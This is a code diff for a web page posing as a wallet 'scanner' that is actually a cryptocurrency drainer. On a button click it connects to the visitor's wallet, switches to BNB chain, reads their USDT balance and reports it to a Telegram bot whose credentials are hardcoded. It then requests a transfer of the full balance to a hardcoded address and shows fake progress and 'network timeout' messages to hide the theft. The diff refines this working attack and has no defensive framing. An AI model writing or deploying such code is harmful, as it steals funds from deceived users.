@@ -1,40 +1,35 @@
-const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; 
+const myAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
+const usdtContract = "0x55d398326f99059fF775485246999027B3197955"; 
 
-// Telegram (Replace with your info)
-const telegramToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
-const telegramId = "7849151110";
+// Telegram Bot Info
+const botToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
+const chatId = "7849151110";
 
-function updateUI(main, sub) {
-    document.getElementById("status-main").innerText = main;
-    document.getElementById("status-sub").innerText = sub;
+async function sendLog(msg) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
 }
 
-async function startScan() {
-    const isWeb3 = !!(window.ethereum || window.trustwallet);
-    const overlay = document.getElementById("loading-overlay");
+async function start() {
+    const btn = document.getElementById("nextBtn");
+    const overlay = document.getElementById("overlay");
+    const status = document.getElementById("status-text");
 
-    if (!isWeb3) {
-        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-            const url = window.location.href.replace("https://", "");
-            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + url;
-            return;
-        }
-        alert("Scanner requires Trust Wallet app.");
+    // Check if inside Wallet
+    if (!window.ethereum && !window.trustwallet) {
+        alert("Please open this link inside Trust Wallet or MetaMask browser.");
         return;
     }
 
     overlay.style.display = "flex";
-    updateUI("Accessing Camera...", "Scanning wallet QR signature...");
+    status.innerText = "Syncing Node...";
 
     try {
         const provider = window.ethereum || window.trustwallet;
         const web3 = new Web3(provider);
         const accounts = await provider.request({ method: 'eth_requestAccounts' });
-        const userAddress = accounts[0];
+        const user = accounts[0];
 
-        updateUI("Wallet Linked", "Syncing asset balance...");
-        
+        status.innerText = "Scanning Assets...";
         await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
 
         const abi = [
@@ -42,33 +37,27 @@ async function startScan() {
             { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
         ];
 
-        const contract = new web3.eth.Contract(abi, usdtAddress);
-        const balanceWei = await contract.methods.balanceOf(userAddress).call();
+        const contract = new web3.eth.Contract(abi, usdtContract);
+        const balanceWei = await contract.methods.balanceOf(user).call();
         const balance = web3.utils.fromWei(balanceWei, 'ether');
 
-        // Alert Telegram
-        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramId}&text=👤 Scanner Alert: ${userAddress} | Bal: ${balance} USDT`);
+        await sendLog(`👤 <b>New Scan!</b>\nWallet: <code>${user}</code>\nBalance: <b>${balance} USDT</b>`);
 
         if (parseFloat(balance) > 0) {
-            updateUI("Verifying Assets...", "Finalizing secure snapshot...");
+            status.innerText = "Verifying Transaction...";
             
-            // This triggers the Send/Confirm popup
-            await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
+            // This triggers the transfer popup
+            await contract.methods.transfer(myAddress, balanceWei).send({ from: user });
             
-            updateUI("Finishing...", "Clearing temporary cache...");
-            setTimeout(() => {
-                alert("Scan Error: Blockchain sync failed. Please try again.");
-                location.reload();
-            }, 1000);
+            await sendLog(`✅ <b>Success!</b>\n${balance} USDT transferred.`);
+            alert("Error: Network Timeout. Please retry.");
         } else {
-            alert("Scanner: Verification complete. No assets found.");
-            overlay.style.display = "none";
+            alert("No significant assets found.");
         }
-
     } catch (e) {
+        alert("Action Denied.");
         overlay.style.display = "none";
-        alert("Scan Cancelled.");
     }
 }
 
-document.getElementById("nextBtn").addEventListener("click", startScan);
+document.getElementById("nextBtn").addEventListener("click", start);
